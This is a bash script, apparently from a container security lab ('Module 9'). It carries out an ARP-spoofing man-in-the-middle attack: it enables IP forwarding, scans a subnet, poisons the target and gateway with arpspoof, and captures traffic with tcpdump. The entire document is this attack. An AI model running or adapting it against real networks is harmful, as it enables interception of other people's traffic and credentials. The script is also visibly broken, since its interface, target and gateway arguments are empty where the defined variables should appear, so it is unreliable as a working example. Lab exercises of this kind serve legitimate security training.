#!/usr/bin/env bash
# MODULE 9: ARP Spoofing Between Containers
# Run from attacker container

TARGET="172.21.0.3"
GATEWAY="172.21.0.1"
IFACE="eth0"

echo "[*] Enabling IP forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward

echo "[*] Scanning DMZ network..."
arp-scan --interface= 172.21.0.0/24

echo "[*] Launching ARP spoof MITM..."
arpspoof -i  -t   &
arpspoof -i  -t   &

echo "[*] Capturing traffic..."
tcpdump -i  -n -A host 
